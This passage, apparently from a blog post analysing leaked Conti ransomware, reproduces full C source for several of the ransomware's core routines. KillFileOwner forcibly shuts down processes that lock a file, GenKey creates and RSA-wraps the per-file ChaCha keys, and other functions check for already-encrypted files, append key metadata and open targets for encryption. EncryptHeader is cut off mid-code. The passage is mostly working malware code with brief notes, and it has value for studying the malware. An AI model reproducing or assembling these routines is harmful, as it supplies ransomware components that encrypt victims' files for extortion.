TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="KillFileOwner"><a href="#KillFileOwner" class="headerlink" title="KillFileOwner"></a>KillFileOwner</h4><p><strong>getapi::IsRestartManagerLoaded()</strong></p>
<p>Restart Manager session，so how can we judge a session is loaded.</p>
<p>We can find the code that modify the value in the anti-hook.cpp, if the Rstrtmgr.dll is loaded, this means the Manager session is loaded.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428190326952.png" alt="image-20220428190326952"></p>
<h5 id="pRmStartSession"><a href="#pRmStartSession" class="headerlink" title="pRmStartSession"></a><strong>pRmStartSession</strong></h5><p>Starts a new Restart Manager session. A maximum of 64 Restart Manager sessions per user session can be open on the system at the same time. When this function starts a session, it returns a session handle and session key that can be used in subsequent calls to the Restart Manager API.</p>
<h5 id="pRmRegisterResources"><a href="#pRmRegisterResources" class="headerlink" title="pRmRegisterResources"></a><strong>pRmRegisterResources</strong></h5><p>Registers resources to a Restart Manager session. The Restart Manager uses the list of resources registered with the session to determine which applications and services must be shut down and restarted。Resources can be identified by filenames, service short names, or <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/restartmanager/ns-restartmanager-rm_unique_process">RM_UNIQUE_PROCESS</a> structures that describe running applications. The <strong>RmRegisterResources</strong> function can be used by a primary or secondary installer.</p>
<h5 id="pRmGetList"><a href="#pRmGetList" class="headerlink" title="pRmGetList"></a><strong>pRmGetList</strong></h5><p>Gets a list of all applications and services that are currently using resources that have been registered with the Restart Manager session.</p>
<h5 id="pRmShutdown"><a href="#pRmShutdown" class="headerlink" title="pRmShutdown"></a><strong>pRmShutdown</strong></h5><p>Initiates the shutdown of applications. This function can only be called from the installer that started the Restart Manager session using the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/restartmanager/nf-restartmanager-rmstartsession">RmStartSession</a> function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">KillFileOwner</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPCWSTR PathName)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!getapi::IsRestartManagerLoaded()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Restart manager not loaded.&quot;</span>));</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BOOL Result = FALSE;</span><br><span class="line">	DWORD dwSession = <span class="number">0x0</span>;</span><br><span class="line">	DWORD ret = <span class="number">0</span>;</span><br><span class="line">	WCHAR szSessionKey[CCH_RM_SESSION_KEY + <span class="number">1</span>];</span><br><span class="line">	RtlSecureZeroMemory(szSessionKey, <span class="keyword">sizeof</span>(szSessionKey));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pRmStartSession(&amp;dwSession, <span class="number">0x0</span>, szSessionKey) == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pRmRegisterResources(dwSession, <span class="number">1</span>, &amp;PathName,</span><br><span class="line">			<span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>) == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			DWORD dwReason = <span class="number">0x0</span>;</span><br><span class="line">			UINT nProcInfoNeeded = <span class="number">0</span>;</span><br><span class="line">			UINT nProcInfo = <span class="number">0</span>;</span><br><span class="line">			PRM_PROCESS_INFO ProcessInfo = <span class="literal">NULL</span>;</span><br><span class="line">			RtlSecureZeroMemory(&amp;ProcessInfo, <span class="keyword">sizeof</span>(ProcessInfo));</span><br><span class="line"></span><br><span class="line">			ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded,</span><br><span class="line">				&amp;nProcInfo, <span class="literal">NULL</span>, &amp;dwReason);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ret != ERROR_MORE_DATA || !nProcInfoNeeded) &#123;</span><br><span class="line"></span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ProcessInfo = (PRM_PROCESS_INFO)memory::Alloc(<span class="keyword">sizeof</span>(RM_PROCESS_INFO) * nProcInfoNeeded);</span><br><span class="line">			<span class="keyword">if</span> (!ProcessInfo) &#123;</span><br><span class="line"></span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			nProcInfo = nProcInfoNeeded;</span><br><span class="line">			ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded,</span><br><span class="line">				&amp;nProcInfo, ProcessInfo, &amp;dwReason);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ret != ERROR_SUCCESS || !nProcInfoNeeded) &#123;</span><br><span class="line"></span><br><span class="line">				memory::Free(ProcessInfo);</span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD ProcessId = (DWORD)pGetProcessId(pGetCurrentProcess());</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; nProcInfo; i++) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (ProcessInfo[i].Process.dwProcessId == ProcessId) &#123;</span><br><span class="line"></span><br><span class="line">					memory::Free(ProcessInfo);</span><br><span class="line">					pRmEndSession(dwSession);</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				process_killer::PPID Pid = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ProcessInfo[i].Process.dwProcessId == Pid-&gt;dwProcessId) &#123;</span><br><span class="line"></span><br><span class="line">						memory::Free(ProcessInfo);</span><br><span class="line">						pRmEndSession(dwSession);</span><br><span class="line">						<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = pRmShutdown(dwSession, RmForceShutdown, <span class="literal">NULL</span>) == ERROR_SUCCESS;</span><br><span class="line">			memory::Free(ProcessInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pRmEndSession(dwSession);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GenKey"><a href="#GenKey" class="headerlink" title="GenKey"></a>GenKey</h4><p>encrypt the public key. The first 32 bytes is the chacha encryption’s key, and the next 4 byte is the IV.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GenKey</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV Provider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey,</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwDataLen = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptGenRandom(Provider, <span class="number">32</span>, FileInfo-&gt;ChachaKey)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;ChachaKey);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptGenRandom(Provider, <span class="number">8</span>, FileInfo-&gt;ChachaIV)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;ChachaIV);</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;FileInfo-&gt;CryptCtx, <span class="keyword">sizeof</span>(FileInfo-&gt;CryptCtx));</span><br><span class="line">	ECRYPT_keysetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaIV);</span><br><span class="line"></span><br><span class="line">	memory::Copy(FileInfo-&gt;EncryptedKey, FileInfo-&gt;ChachaKey, <span class="number">32</span>);</span><br><span class="line">	memory::Copy(FileInfo-&gt;EncryptedKey + <span class="number">32</span>, FileInfo-&gt;ChachaIV, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;EncryptedKey);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptEncrypt(PublicKey, <span class="number">0</span>, TRUE, <span class="number">0</span>, FileInfo-&gt;EncryptedKey, &amp;dwDataLen, <span class="number">524</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckContiPatter"><a href="#CheckContiPatter" class="headerlink" title="CheckContiPatter"></a>CheckContiPatter</h4><blockquote>
<p>g_ContiPattern is a global arg that has a certain value.Read 16 bytes of the file,And check with below.</p>
<p>STATIC CONST BYTE g_ContiPattern[16] &#x3D; { 0xab, 0xff, 0x63, 0xa1, 0x6f, 0xa2 , 0x6e, 0x6e, 0xa3, 0x74, 0x69, 0xbf, 0x4c, 0xdd, 0xff, 0xa1 };</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CheckContiPattern</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo, </span></span><br><span class="line"><span class="params">	__out PBOOL Error</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	LARGE_INTEGER Pointer;</span><br><span class="line">	Pointer.QuadPart = <span class="number">-16</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Pointer, <span class="literal">NULL</span>, FILE_END)) &#123;</span><br><span class="line"></span><br><span class="line">		*Error = TRUE;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD TotalRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD Offset = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">16</span>;</span><br><span class="line">	BYTE Buffer[<span class="number">16</span>];</span><br><span class="line">	RtlSecureZeroMemory(Buffer, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalRead != <span class="number">16</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pReadFile(FileInfo-&gt;FileHandle, Buffer + Offset, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>) || !BytesRead) &#123;</span><br><span class="line">			</span><br><span class="line">			*Error = TRUE;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TotalRead += BytesRead;</span><br><span class="line">		Offset += BytesRead;</span><br><span class="line">		BytesToRead -= BytesRead;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*Error = FALSE;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(g_ContiPattern, Buffer, <span class="number">16</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="WriteEncryptInfo"><a href="#WriteEncryptInfo" class="headerlink" title="WriteEncryptInfo"></a>WriteEncryptInfo</h4><p>write the Encryption note to the txt.</p>
<blockquote>
<p>mainly use the pSetFilePointerEx to make it.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">WriteEncryptInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in BYTE EncryptMode,</span></span><br><span class="line"><span class="params">	__in BYTE DataPercent</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line">	BYTE Buffer[<span class="number">10</span>];</span><br><span class="line">	Buffer[<span class="number">0</span>] = EncryptMode;</span><br><span class="line">	Buffer[<span class="number">1</span>] = DataPercent;</span><br><span class="line">	memory::Copy(Buffer + <span class="number">2</span>, &amp;FileInfo-&gt;FileSize, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	Offset.QuadPart = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_END)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Success = WriteFullData(FileInfo-&gt;FileHandle, FileInfo-&gt;EncryptedKey, <span class="number">524</span>);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pSetEndOfFile(FileInfo-&gt;FileHandle);</span><br><span class="line">	Success = (BOOL)pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="OpenFileEncrypt"><a href="#OpenFileEncrypt" class="headerlink" title="OpenFileEncrypt"></a>OpenFileEncrypt</h4><p>pGetFileAttributesW</p>
<p>pSetFileAttributesW</p>
<p>FileInfo-&gt;FileHandle &#x3D; pCreateFileW(FileInfo-&gt;Filename,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);</p>
<p>KillFileOwner</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line"><span class="title function_">OpenFileEncrypt</span><span class="params">(__in cryptor::LPFILE_INFO FileInfo)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo-&gt;Filename);</span><br><span class="line">	<span class="keyword">if</span> (Attributes != INVALID_FILE_ATTRIBUTES) &#123;</span><br><span class="line">		<span class="keyword">if</span> (Attributes &amp; FILE_ATTRIBUTE_READONLY) &#123;</span><br><span class="line">			pSetFileAttributesW(FileInfo-&gt;Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD LastError = (DWORD)pGetLastError();</span><br><span class="line">	<span class="keyword">if</span> (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (LastError == ERROR_SHARING_VIOLATION ||</span><br><span class="line">			LastError == ERROR_LOCK_VIOLATION)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			logs::Write(OBFW(<span class="string">L&quot;File %s is already open by another program.&quot;</span>), FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (KillFileOwner(FileInfo-&gt;Filename))</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				logs::Write(OBFW(<span class="string">L&quot;KillFileOwner for file %s - success&quot;</span>), FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">				FileInfo-&gt;FileHandle = pCreateFileW(FileInfo-&gt;Filename,</span><br><span class="line">					GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>,</span><br><span class="line">					OPEN_EXISTING,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (FileInfo-&gt;FileHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">					logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t open file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				logs::Write(OBFW(<span class="string">L&quot;KillFileOwner for file %s - error. GetLastError = %lu.&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t open file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LARGE_INTEGER FileSize;</span><br><span class="line">	<span class="keyword">if</span> (!pGetFileSizeEx(FileInfo-&gt;FileHandle, &amp;FileSize) || !FileSize.QuadPart) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get file size %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		CloseHandle(FileInfo-&gt;FileHandle);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FileInfo-&gt;FileSize = FileSize.QuadPart;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="EncryptHeader"><a href="#EncryptHeader" class="headerlink" title="EncryptHeader"></a>EncryptHeader</h4><p>encrypt the file’s first 1048576 byte </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">EncryptHeader</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE 